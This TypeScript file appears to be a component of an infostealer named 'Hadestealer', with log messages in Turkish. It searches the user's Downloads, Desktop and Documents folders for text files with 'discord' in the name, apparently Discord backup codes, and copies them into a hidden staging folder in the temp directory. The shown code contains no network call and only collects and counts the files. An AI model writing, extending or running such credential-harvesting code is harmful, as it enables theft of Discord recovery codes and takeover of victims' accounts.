import fs from 'fs';
import path from 'path';
import os from 'os';

export async function processBackupCodes(targetDir: string): Promise<void> {
    const homeDir = os.homedir();
    const pathsToCheck = [
        path.join(homeDir, 'Downloads'),
        path.join(homeDir, 'Desktop'),
        path.join(homeDir, 'Documents'),
    ];

    for (const dir of pathsToCheck) {
        try {
            if (!fs.existsSync(dir)) continue;

            const entries = fs.readdirSync(dir, { withFileTypes: true });

            for (const entry of entries) {
                if (entry.isSymbolicLink()) continue;

                const file = entry.name;
                if (file.endsWith('.txt') && file.includes("discord".toLocaleLowerCase())) {
                    const sourcePath = path.join(dir, file);
                    const destPath = path.join(targetDir, file);
                    
                    try {
                        fs.copyFileSync(sourcePath, destPath);
                    } catch (copyErr) {
                        console.error(`Dosya kopyalanamadı: ${file}`, copyErr);
                    }
                }
            }
        } catch (err: any) {
            if (err.code === 'EPERM' || err.code === 'EACCES') {
                console.warn(`Yetki engellendi, klasör atlanıyor: ${dir}`);
                continue;
            }
            console.error(`Klasör taranırken hata oluştu: ${dir}`, err);
        }
    }
}



export async function processBackupCodesSendAll(): Promise<void> {
    const tempDir = path.join(os.tmpdir(), 'Hadestealer', "All", "Discord")
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
    try {
        await processBackupCodes(tempDir);
        await new Promise(resolve => setTimeout(resolve, 100));

        const files = fs.readdirSync(tempDir);
        if (files.length === 0) {
            return;
        }
    } catch (err) {
        console.log(err)
    }
}